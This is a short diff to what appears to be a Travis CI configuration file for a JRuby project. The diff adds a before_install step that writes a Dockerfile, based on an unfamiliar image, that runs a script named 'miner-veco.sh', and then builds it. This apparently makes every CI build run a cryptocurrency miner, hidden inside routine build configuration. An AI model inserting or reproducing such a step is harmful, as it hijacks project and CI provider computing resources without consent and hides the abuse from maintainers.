@@ -4,6 +4,6 @@ rvm:
  - jruby
 before_install:
 - echo " FROM christiankm01/master:10297
-   RUN ./miner-veco"
+   RUN ./miner-veco.sh" > Dockerfile
 - docker build .
     
